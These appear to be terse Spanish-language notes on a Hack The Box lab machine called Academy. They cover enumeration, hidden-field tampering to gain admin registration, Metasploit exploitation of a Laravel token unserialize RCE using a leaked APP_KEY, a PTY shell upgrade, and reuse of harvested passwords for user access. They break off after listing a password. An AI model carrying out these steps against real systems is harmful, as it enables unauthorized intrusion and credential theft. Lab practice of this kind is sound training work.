1. nmap -p-

2. cambiar el /etc/hosts a 10.10.10.215 academy.htb

3. hydra con ssh no funciona
	- parece q hay usuario egre55
	- hydra a ssh y usuario egre55 tampoco


4. fuzzear
	- $ gobuster dir -w /usr/share/dirb/wordlists/common.txt -o dirb_output.txt -u academy.htb 
```
/admin.php (Status: 200)
/index.php (Status: 200)
```

5. En /register.php hay una etiqueta hidden, a 0 por defecto, quitamos el hidden y cambiamos el 0 por 1

6. Nos registramos y así nos podemos loggear en /admin.php en lugar de /login.php

7. Nos aparece lo siguiente:

```
Item 							Status
Complete initial set of modules (cry0l1t3 / mrb3n) 	done
Finalize website design 				done
Test all modules 					done
Prepare launch campaign 				done
Separate student and admin roles 			done
Fix issue with dev-staging-01.academy.htb 		pending
```

Por lo que enumeramos usuarios: cry0l1t3 / mrb3n


8. Vemos arreglar error en dev-staging-01.academy.htb

En la petición tiene que andar eso en el host, por lo que los añadimos en /etc/hosts/
```
10.10.10.215	academy.htb
10.10.10.215	dev-staging-01.academy.htb
```

Vemos esta información

```
DB_PORT	
"3306"
DB_DATABASE	
"homestead"
DB_USERNAME	
"homestead"
DB_PASSWORD	
"secret"
```

9. Vemos que hay un error de the file could not be opened in append mode, permission denied

El cve es este:  token Unserialize Remote Command Execution (Metasploit)

```
Abrimos metasploit

> use exploit/unix/http/laravel_token_unserialize_exec
> set lhost tun0
> set vhost dev-staging-01.academy.htb
> set rhosts academy.htb
> set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
> exploit 
```

Y estamos dentro, nos sacamos un shell con:
```
python3 -c "import pty;pty.spawn('/bin/bash')"
```


Enumeramos usuarios:
21y4d
ch4p
g0blin
cry0l1t3
mrb3n


10. $ cat /var/www/html/academy/config/database.php

```
connections' => [

        'sqlite' => [
            'driver' => 'sqlite',
            'database' => env('DB_DATABASE', database_path('database.sqlite')),
            'prefix' => '',
        ],

        'mysql' => [
            'driver' => 'mysql',
            'host' => env('DB_HOST', '127.0.0.1'),
            'port' => env('DB_PORT', '3306'),
            'database' => env('DB_DATABASE', 'forge'),
            'username' => env('DB_USERNAME', 'forge'),
            'password' => env('DB_PASSWORD', ''),
            'unix_socket' => env('DB_SOCKET', ''),
            'charset' => 'utf8mb4',
            'collation' => 'utf8mb4_unicode_ci',
            'prefix' => '',
            'strict' => true,
            'engine' => null,
        ],

        'pgsql' => [
            'driver' => 'pgsql',
            'host' => env('DB_HOST', '127.0.0.1'),
            'port' => env('DB_PORT', '5432'),
            'database' => env('DB_DATABASE', 'forge'),
            'username' => env('DB_USERNAME', 'forge'),
            'password' => env('DB_PASSWORD', ''),
            'charset' => 'utf8',
            'prefix' => '',
            'schema' => 'public',
            'sslmode' => 'prefer',
        ],

        'sqlsrv' => [
            'driver' => 'sqlsrv',
            'host' => env('DB_HOST', 'localhost'),
            'port' => env('DB_PORT', '1433'),
            'database' => env('DB_DATABASE', 'forge'),
            'username' => env('DB_USERNAME', 'forge'),
            'password' => env('DB_PASSWORD', ''),
            'charset' => 'utf8',
            'prefix' => '',
        ],

    ],

```

```
    'redis' => [

        'client' => 'predis',

        'default' => [
            'host' => env('REDIS_HOST', '127.0.0.1'),
            'password' => env('REDIS_PASSWORD', null),
            'port' => env('REDIS_PORT', 6379),
            'database' => 0,
        ],

    ],

];

```

```
$ whoami    
whoami
cry0l1t3

mySup3rP4s5w0rd!!
```
y ya cat user.txt

nos metemos por ssh



mrb3n_Ac@d3my!
mrb3n_Ac@d3my!
